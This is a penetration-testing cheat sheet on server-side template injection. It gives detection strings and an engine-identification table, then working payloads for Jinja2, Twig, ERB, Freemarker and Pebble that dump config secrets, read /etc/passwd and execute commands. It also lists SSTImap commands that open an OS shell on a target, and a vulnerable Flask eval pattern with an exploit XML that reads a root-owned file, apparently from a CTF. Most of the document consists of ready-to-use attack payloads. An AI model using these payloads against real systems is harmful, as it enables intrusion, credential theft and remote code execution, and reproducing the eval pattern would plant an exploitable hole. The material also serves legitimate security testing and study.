# SSTI (Server-Side Template Injection)

[PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) | [SSTI Payloads](https://github.com/payloadbox/ssti-payloads)

---

## Confirm SSTI

### Break Template Syntax

```
${{<%[%'"}}%\.
```

If this causes a server error, SSTI is likely.

### Basic Math Test

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

If `49` appears, template is executing code.

---

## Identify Template Engine

| Payload | Result | Engine |
|---------|--------|--------|
| `${7*7}` | 49 | Freemarker, Thymeleaf, etc. |
| `{{7*7}}` | 49 | Jinja2, Twig, etc. |
| `{{7*'7'}}` | 7777777 | **Jinja2** |
| `{{7*'7'}}` | 49 | **Twig** |
| `<%= 7*7 %>` | 49 | ERB (Ruby) |
| `#{7*7}` | 49 | Pebble, Thymeleaf |

---

## Jinja2 (Python/Flask)

### Information Disclosure

```jinja2
# Dump config (includes secret keys)
{{ config.items() }}

# Dump builtins
{{ self.__init__.__globals__.__builtins__ }}
```

### Local File Read

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### RCE

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Alternative Paths to RCE

```jinja2
# Via request object
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# Via config object
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("whoami").read() }}

# Via import_string
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("id").read() }}
```

---

## Twig (PHP/Symfony)

### Information Disclosure

```twig
{{ _self }}
```

### Local File Read (Symfony only)

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

### RCE

```twig
{{ ['id'] | filter('system') }}
{{ ['cat /etc/passwd'] | filter('system') }}
{{ ['whoami'] | map('system') }}
```

---

## SSTImap (Automated Tool)

```bash
# Install
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt

# Auto-detect SSTI
python3 sstimap.py -u "http://TARGET/page?name=test"

# Download file
python3 sstimap.py -u "http://TARGET/page?name=test" -D '/etc/passwd' './passwd'

# Execute command
python3 sstimap.py -u "http://TARGET/page?name=test" -S id

# Interactive shell
python3 sstimap.py -u "http://TARGET/page?name=test" --os-shell
```

---

## Python eval() in f-string / format string

When user input is interpolated into a string that is then passed to **`eval()`** (e.g. `eval(f"f'''{template}'''")`), any field that allows **`{...}`**-style expressions can execute Python.

**Vulnerable code (Flask, XML-derived fields):**

```python
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # ...
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
```

**Regex bypassed:** `^[a-zA-Z0-9._'\"(){}=+/]+$` — allows `{`, `}`, `(`, `)`, `'`, `"`, `.`, etc., so a value like `{open("/root/root.txt").read()}` passes validation and is then evaluated inside the f-string.

**Exploit XML (file read):**

```xml
<patient>
    <firstname>John</firstname>
    <lastname>Doe</lastname>
    <sender_app>{open("/root/root.txt").read()}</sender_app>
    <timestamp>2222</timestamp>
    <birth_date>01/01/1985</birth_date>
    <gender>Male</gender>
</patient>
```

**RCE variant:**

```xml
<sender_app>{__import__('os').system('id')}</sender_app>
```

---

## Other Engines Quick Reference

### ERB (Ruby)

```erb
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

### Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Pebble (Java)

```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

---

## Resources

- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
